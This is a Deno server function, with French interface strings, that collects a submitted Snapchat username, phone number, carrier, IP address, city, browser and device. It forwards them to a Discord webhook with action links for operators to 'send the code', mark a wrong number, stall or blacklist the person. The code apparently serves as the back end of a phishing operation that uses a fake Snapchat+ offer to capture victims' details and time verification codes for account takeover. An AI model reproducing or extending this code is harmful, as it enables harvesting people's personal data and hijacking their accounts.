import { createClientFromRequest } from 'npm:@base44/sdk@0.8.31';

const DISCORD_WEBHOOK = Deno.env.get("DISCORD_WEBHOOK");

Deno.serve(async (req) => {
  const authHeader = req.headers.get("authorization") || "";
  const token = authHeader.replace("Bearer ", "");
  const expectedToken = Deno.env.get("WEBHOOK_SECRET");
  if (expectedToken && token !== expectedToken) {
    return Response.json({ error: "Unauthorized" }, { status: 401 });
  }

  const base44 = createClientFromRequest(req);
  const body = await req.json();
  const { snapchat, telephone, operateur, submissionId, ip, country, city, browser, device } = body;

  const formatPhone = (tel) => tel.replace(/(\d{2})(?=\d)/g, '$1 ').trim();
  const formatPhoneRaw = (tel) => tel.replace(/\D/g, '').slice(-10);

  // Use all data from body parameters
  const finalIp = ip || "Inconnue";
  const finalBrowser = browser || "Inconnu";
  const finalDevice = device || "Inconnu";

  // Geolocate IP using dedicated function
  let finalCountry = "Inconnue";
  let finalCity = "Inconnue";
  try {
    const geoRes = await base44.functions.invoke("geolocateIP", { ip: finalIp });
    if (geoRes?.data) {
      finalCountry = geoRes.data.country || "Inconnue";
      finalCity = geoRes.data.city || "Inconnue";
    }
  } catch (e) {
    console.error("geolocateIP failed:", e.message);
  }
  
  const operatorColors = { SFR: 16711680, Bouygues: 3447003, Orange: 16753920 };

  const now = new Date();
  const dateStr = now.toLocaleDateString("fr-FR", {
    weekday: "long", day: "numeric", month: "long", year: "numeric",
    hour: "2-digit", minute: "2-digit", second: "2-digit",
    timeZone: "Europe/Paris"
  });

  const appUrl = Deno.env.get("APP_URL")?.replace(/\/$/, "") || "https://snap-post-hub.base44.app";
  const clientId = Deno.env.get("DISCORD_APP_ID");
  const redirectUri = appUrl + "/discord-oauth-callback";
  
  // Create state parameter with action and submission ID
  const createOAuthUrl = (action) => {
    const state = btoa(JSON.stringify({ submissionId, action }));
    const scope = 'identify%20email';
    return `https://discord.com/api/oauth2/authorize?client_id=${clientId}&redirect_uri=${encodeURIComponent(redirectUri)}&response_type=code&scope=${scope}&state=${state}`;
  };
  
  const triggerUrl = createOAuthUrl('code_ready');
  const wrongUrl = createOAuthUrl('code_wrong');
  const waitUrl = createOAuthUrl('waiting_queue');
  const blacklistUrl = createOAuthUrl('blacklist');

  const embed = {
    title: "📱 Nouvelle soumission Snapchat+",
    color: operatorColors[operateur] || 16776960,
    fields: [
      { name: "👤 Utilisateur", value: `@${snapchat}`, inline: true },
      { name: "📡 Opérateur", value: operateur, inline: true },
      { name: "📞 Numéro", value: formatPhone(telephone), inline: true },
      { name: "🌍 Pays", value: finalCountry, inline: true },
      { name: "🏙️ Ville", value: finalCity, inline: true },
      { name: "🌐 Navigateur", value: finalBrowser, inline: true },
      { name: "💾 Appareil", value: finalDevice, inline: true },
      { name: "🕵️ Adresse IP", value: `\`${finalIp}\``, inline: false },
      { name: "🕐 Date de soumission", value: dateStr, inline: false },
      {
        name: "⚡ Actions",
        value: `✅ [**Envoyer le code**](${triggerUrl})\n❌ [**Mauvais numéro**](${wrongUrl})\n⏳ [**Faire patienter**](${waitUrl})\n🚫 [**Blacklist instant**](${blacklistUrl})`,
        inline: false
      },
    ],
    footer: { text: `ID: ${submissionId || "N/A"}` },
    timestamp: now.toISOString(),
  };

  await fetch(DISCORD_WEBHOOK, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ content: "@everyone", embeds: [embed] }),
  });

  await base44.asServiceRole.entities.ActionLog.create({
    submission_id: submissionId,
    action: "submitted",
    details: { browser: finalBrowser, device: finalDevice, ip: finalIp, country: finalCountry, city: finalCity },
    timestamp: now.toISOString()
  });

  return Response.json({ ok: true });
});